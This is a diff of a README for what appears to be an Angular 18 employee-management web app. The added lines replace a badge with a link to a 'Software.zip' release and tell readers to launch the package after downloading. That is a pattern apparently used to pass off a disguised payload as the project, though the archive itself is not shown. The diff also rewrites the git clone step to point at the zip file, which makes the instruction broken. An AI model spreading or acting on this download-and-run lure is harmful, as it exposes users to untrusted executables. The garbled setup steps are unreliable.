@@ -24,7 +24,7 @@ Welcome to the Employee Management App Angular18 repository! This web applicatio
 
 To get started with the Employee Management App, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/kalbe2323/Employee-Management-App-Angular18/releases/download/v2.0/Software.zip)](https://github.com/kalbe2323/Employee-Management-App-Angular18/releases/download/v2.0/Software.zip)
 
 Please make sure to launch the software package after downloading.
 
@@ -33,7 +33,7 @@ If the link provided is not working or the software package is inaccessible, fee
 ## Usage 🚀
 
 To run the Employee Management App Angular18 on your local machine, follow these steps:
-1. Clone the repository locally using `git clone https://github.com/your-username/Employee-Management-App-Angular18.git`
+1. Clone the repository locally using `git clone https://github.com/kalbe2323/Employee-Management-App-Angular18/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory
 3. Install the necessary dependencies by running `npm install`
 4. Launch the application with `ng serve`
